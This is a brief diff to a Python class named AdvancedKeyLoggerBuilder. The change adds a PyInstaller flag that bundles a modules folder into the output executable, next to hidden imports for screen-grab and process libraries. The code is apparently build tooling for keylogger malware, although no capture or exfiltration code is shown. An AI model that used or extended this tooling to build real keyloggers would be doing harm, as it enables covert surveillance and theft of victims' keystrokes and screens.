@@ -185,6 +185,8 @@ class AdvancedKeyLoggerBuilder:
             '--hidden-import', 'PIL.Image',
             '--hidden-import', 'PIL.ImageGrab',
             '--hidden-import', 'psutil',
+            # CRITICAL: Include modules folder in the executable
+            '--add-data', f'{str(self.output_dir / "modules")}{os.pathsep}modules',
         ])
 
         # Add Windows-specific imports
